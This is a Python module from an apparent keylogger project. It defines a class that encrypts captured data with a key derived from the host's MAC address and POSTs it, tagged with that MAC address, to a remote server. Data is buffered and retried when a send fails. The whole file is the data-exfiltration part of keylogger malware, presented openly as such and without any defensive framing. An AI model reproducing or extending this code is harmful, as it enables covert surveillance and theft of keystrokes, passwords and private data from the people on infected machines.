import json

import requests
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt
from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt


class NetworkWrite:
    def __init__(self, server_link):
        self.__server_link = server_link
        self.__mac = get_mac_address()
        self.__left_data = ''
        self.__key = Encrypt.create_key(self.__mac)


    def write_to_server(self, data):
        res_status = ''
        try:
            data = Encrypt.encrypt_data(self.__left_data + str(data), self.__key)
            send_data = {'data': str(data), 'mac': self.__mac}
            res = requests.post(self.__server_link, json=send_data)
            res_status = res.status_code
            self.__left_data = ''
            print('net writed')
        except:
            if res_status != 200:
                self.__left_data += Decrypt.decrypt_data(data, self.__key)
                print('left data')